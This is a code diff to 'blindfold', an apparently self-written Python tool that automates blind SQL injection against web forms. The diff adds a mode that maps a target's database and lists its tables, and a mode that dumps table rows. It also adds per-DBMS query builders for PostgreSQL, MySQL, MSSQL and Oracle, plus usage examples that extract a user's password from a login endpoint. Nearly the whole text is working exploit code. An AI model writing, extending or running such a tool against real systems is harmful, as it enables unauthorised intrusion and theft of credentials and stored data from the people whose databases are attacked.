@@ -34,7 +34,14 @@ No sqlmap. Only `requests` is required.
 
 ----------------------------------------------------------------------
 EXAMPLES
-  # fully automatic (detect context, DBMS, technique, then extract)
+  # DEFAULT: just map the DB (DBMS + current database + table list)
+  python3 blindfold.py -u http://t:3000/login -d "username=INJECT&password=test"
+
+  # dump a specific table (columns auto-discovered; rows capped by --max-rows)
+  python3 blindfold.py -u http://t:3000/login -d "username=INJECT&password=test" \
+      --dump users
+
+  # power mode: extract one specific scalar
   python3 blindfold.py -u http://t:3000/login \
       -d "username=INJECT&password=test" \
       --query "SELECT password FROM users WHERE username='antwon'"
@@ -84,6 +91,22 @@ class Dbms:
         m = re.search(re.escape(DELIM) + "(.*?)" + re.escape(DELIM), text, re.S)
         return m.group(1) if m else None
 
+    # --- schema mapping queries (override per DBMS) ---
+    list_sep = ","
+    row_sep = "|"
+    def q_current_db(self): return "SELECT current_database()"
+    def q_tables(self):
+        return ("SELECT string_agg(table_name,',') FROM information_schema.tables "
+                "WHERE table_schema=current_schema()")
+    def q_columns(self, t):
+        return (f"SELECT string_agg(column_name,',') FROM information_schema.columns "
+                f"WHERE table_name='{t}'")
+    def q_count(self, t): return f"SELECT count(*) FROM {t}"
+    def concat_cols(self, cols):
+        return " || '|' || ".join(f"coalesce(cast({c} as text),'')" for c in cols)
+    def q_row(self, t, cols, off):
+        return f"SELECT {self.concat_cols(cols)} FROM {t} ORDER BY 1 LIMIT 1 OFFSET {off}"
+
 
 class Postgres(Dbms):
     name = "postgresql"
@@ -111,6 +134,17 @@ class MySQL(Dbms):
     def error_value(self, text):
         m = re.search(r"~([^'<>\"]+)", text)
         return m.group(1) if m else None
+    def q_current_db(self): return "SELECT database()"
+    def q_tables(self):
+        return ("SELECT group_concat(table_name) FROM information_schema.tables "
+                "WHERE table_schema=database()")
+    def q_columns(self, t):
+        return (f"SELECT group_concat(column_name) FROM information_schema.columns "
+                f"WHERE table_schema=database() AND table_name='{t}'")
+    def concat_cols(self, cols):
+        return "concat_ws('|'," + ",".join(cols) + ")"
+    def q_row(self, t, cols, off):
+        return f"SELECT {self.concat_cols(cols)} FROM {t} ORDER BY 1 LIMIT {off},1"
 
 
 class MSSQL(Dbms):
@@ -123,6 +157,18 @@ class MSSQL(Dbms):
         return f"IF ({cond}) WAITFOR DELAY '0:0:{max(1, int(round(sleep)))}'"
     def error_expr(self, inner):
         return f"1=CAST(('{DELIM}'+CAST(({inner}) AS varchar(8000))+'{DELIM}') AS int)"
+    def q_current_db(self): return "SELECT DB_NAME()"
+    def q_tables(self):
+        return ("SELECT STRING_AGG(table_name,',') FROM information_schema.tables "
+                "WHERE table_type='BASE TABLE'")
+    def q_columns(self, t):
+        return (f"SELECT STRING_AGG(column_name,',') FROM information_schema.columns "
+                f"WHERE table_name='{t}'")
+    def concat_cols(self, cols):
+        return "concat(" + ",'|',".join(cols) + ")"
+    def q_row(self, t, cols, off):
+        return (f"SELECT {self.concat_cols(cols)} FROM {t} "
+                f"ORDER BY (SELECT NULL) OFFSET {off} ROWS FETCH NEXT 1 ROWS ONLY")
 
 
 class Oracle(Dbms):
@@ -130,6 +176,18 @@ class Oracle(Dbms):
     stacked = False
     fingerprints = ["(SELECT 1 FROM v$version WHERE rownum=1)=1"]
     # boolean works great; time/error left None (handled via boolean fallback)
+    def q_current_db(self): return "SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual"
+    def q_tables(self):
+        return "SELECT listagg(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables"
+    def q_columns(self, t):
+        return (f"SELECT listagg(column_name,',') WITHIN GROUP (ORDER BY column_id) "
+                f"FROM user_tab_columns WHERE table_name='{t.upper()}'")
+    def concat_cols(self, cols):
+        return " || '|' || ".join(f"to_char({c})" for c in cols)
+    def q_row(self, t, cols, off):
+        return (f"SELECT {self.concat_cols(cols)} FROM "
+                f"(SELECT a.*, ROWNUM rn FROM (SELECT * FROM {t} ORDER BY 1) a "
+                f"WHERE ROWNUM <= {off+1}) WHERE rn = {off+1}")
 
 
 DBMS_LIST = [Postgres(), MySQL(), MSSQL(), Oracle()]
@@ -432,26 +490,26 @@ def detect(target, a):
 # ===========================================================================
 # Extraction
 # ===========================================================================
-def extract_error(target, dbms, ctx, a):
+def extract_error(target, dbms, ctx, a, query=None):
     """One-shot (or chunked) dump via reflected error."""
+    query = query if query is not None else a.query
     def leak(inner):
         p = f"{ctx.close}{ctx.logic}{dbms.error_expr(inner)}{dbms.comment}"
         return dbms.error_value(target.send(p).text)
 
     if not dbms.error_trunc:
-        val = leak(f"({a.query})")
-        return val
+        return leak(f"({query})")
     # chunked for DBMS that truncate error text (e.g. MySQL)
     out, start, chunk = "", 1, dbms.error_trunc
     while True:
-        piece = leak(f"substring(({a.query}),{start},{chunk})")
-        if piece is None:
+        piece = leak(f"substring(({query}),{start},{chunk})")
+        if not piece:
             break
         out += piece
         if len(piece) < chunk:
             break
         start += chunk
-        if start > a.maxlen:
+        if start > a.maxlen * 16:        # generous cap for long aggregates
             break
     return out
 
@@ -490,10 +548,88 @@ def extract_search(oracle, a, state_path, sig, value="", length=None):
     return value
 
 
+# ===========================================================================
+# Schema mapping  (default action) and table dump
+# ===========================================================================
+def _bin_length(oracle, query, cap):
+    """Length of the scalar via binary search on length(query) (handles long values)."""
+    lenexpr = oracle.dbms.length(query)
+    hi = 1
+    while hi < cap and oracle.fires(f"{lenexpr}>{hi}"):
+        hi *= 2
+    hi = min(hi, cap)
+    lo = 0
+    while lo < hi:
+        mid = (lo + hi) // 2
+        if oracle.fires(f"{lenexpr}>{mid}"):
+            lo = mid + 1
+        else:
+            hi = mid
+    return lo
+
+
+def read_scalar(target, det, a, query, cap=4096):
+    """Extract one scalar with the detected technique (no checkpoint; for map/dump)."""
+    if det.technique == "error-based":
+        return extract_error(target, det.dbms, det.ctx, a, query)
+    o = det.oracle
+    n = _bin_length(o, query, cap)
+    if n == 0:
+        return ""
+    if a.threads > 1 and o.kind == "boolean-based":
+        with ThreadPoolExecutor(max_workers=a.threads) as ex:
+            chars = list(ex.map(lambda p: o.char(query, p), range(1, n + 1)))
+        return "".join(chars)
+    return "".join(o.char(query, p) for p in range(1, n + 1))
+
+
+def _split_list(s):
+    return [x for x in re.split(r",", s or "") if x != ""]
+
+
+def map_mode(target, det, a):
+    db = read_scalar(target, det, a, det.dbms.q_current_db())
+    tables = _split_list(read_scalar(target, det, a, det.dbms.q_tables()))
+    print("\n=== DATABASE MAP ===")
+    print(f"DBMS     : {det.dbms.name}")
+    print(f"Database : {db}")
+    print(f"Tables   : {len(tables)}")
+    for t in tables:
+        print(f"  - {t}")
+    print(f"\n[i] dump a table with:  --dump <table>   (rows capped by --max-rows)")
+
+
+def dump_mode(target, det, a):
+    table = a.dump
+    cols = _split_list(read_scalar(target, det, a, det.dbms.q_columns(table)))
+    if not cols:
+        print(f"[!] no columns found for '{table}' (wrong name or schema?)")
+        return
+    raw = read_scalar(target, det, a, det.dbms.q_count(table)) or "0"
+    count = int(re.sub(r"[^0-9]", "", raw) or "0")
+    limit = min(count, a.max_rows)
+    print(f"\n=== DUMP: {table} ===")
+    print(f"columns ({len(cols)}): {', '.join(cols)}")
+    print(f"rows: {count}" + (f"  (showing first {limit}, raise with --max-rows)" if count > limit else ""))
+    rows = []
+    for i in range(limit):
+        cells = (read_scalar(target, det, a, det.dbms.q_row(table, cols, i)) or "").split("|")
+        rows.append((cells + [""] * len(cols))[:len(cols)])
+    widths = [len(c) for c in cols]
+    for r in rows:
+        for j, cell in enumerate(r):
+            widths[j] = max(widths[j], len(cell))
+    line = lambda vals: " | ".join(v.ljust(widths[j]) for j, v in enumerate(vals))
+    print("\n" + line(cols))
+    print("-+-".join("-" * w for w in widths))
+    for r in rows:
+        print(line(r))
+
+
 # ---------------------------- resume / checkpoint ----------------------------
 def job_signature(a, det, target):
     raw = "|".join([target.method, target.url or "", target.data or "",
-                    det.technique, det.dbms.name, det.ctx.name, a.query,
+                    det.technique, det.dbms.name, det.ctx.name, a.query or "",
                     str(a.sleep), str(a.cmin), str(a.cmax)])
     return hashlib.sha1(raw.encode()).hexdigest()[:10]
 
@@ -514,15 +650,20 @@ def save_state(path, sig, length, value, count):
 
 
 def main():
-    ap = argparse.ArgumentParser(description="Structured multi-DBMS blind SQLi extractor (error/boolean/time)")
+    ap = argparse.ArgumentParser(
+        description="blindfold - auto-detecting blind SQLi extractor (DBMS + error/boolean/time)")
     src = ap.add_argument_group("target (use -u/-d/-H  OR  --request)")
     src.add_argument("-u", "--url"); src.add_argument("-d", "--data")
     src.add_argument("-H", "--header", action="append")
     src.add_argument("-X", "--method"); src.add_argument("--request")
     src.add_argument("--proto", default="http")
 
+    act = ap.add_argument_group("action (default: map the database)")
+    act.add_argument("--query", help="extract a single SQL scalar (power mode)")
+    act.add_argument("--dump", metavar="TABLE", help="dump rows of TABLE (columns auto-discovered)")
+    act.add_argument("--max-rows", type=int, default=50, dest="max_rows", help="row cap for --dump (default 50)")
+
     inj = ap.add_argument_group("injection")
-    inj.add_argument("--query", required=True, help="SQL scalar to extract")
     inj.add_argument("--marker", default="INJECT")
     inj.add_argument("--no-encode", dest="encode", action="store_false")
 
@@ -556,6 +697,8 @@ def main():
         ap.error("provide -u/--url (with -d/-H) or --request")
     if a.force_boolean and a.force_time:
         ap.error("--force-boolean and --force-time are mutually exclusive")
+    if a.query and a.dump:
+        ap.error("--query and --dump are mutually exclusive")
 
     target = Target(a)
 
@@ -568,9 +711,20 @@ def main():
     print(f"\n[+] DBMS      : {det.dbms.name}")
     print(f"[+] TECHNIQUE : {det.technique}")
     print(f"[+] CONTEXT   : {det.ctx.name}" + (f"  signal={det.signal}" if det.signal else ""))
-    print(f"[*] detection cost: {target.count} requests\n")
+    print(f"[*] detection cost: {target.count} requests")
 
-    print("=== PHASE 2: extraction ===")
+    # ---- action dispatch ----
+    if a.dump:
+        dump_mode(target, det, a)
+        print(f"\n[*] total requests: {target.count}  ({det.technique}, {det.dbms.name})")
+        return
+    if not a.query:
+        map_mode(target, det, a)
+        print(f"\n[*] total requests: {target.count}  ({det.technique}, {det.dbms.name})")
+        return
+
+    # ---- --query : single scalar with resume ----
+    print("\n=== EXTRACTION ===")
     sig = job_signature(a, det, target)
     state_path = a.state or f".pgtb-{sig}.json"
     print(f"[*] query : {a.query}")
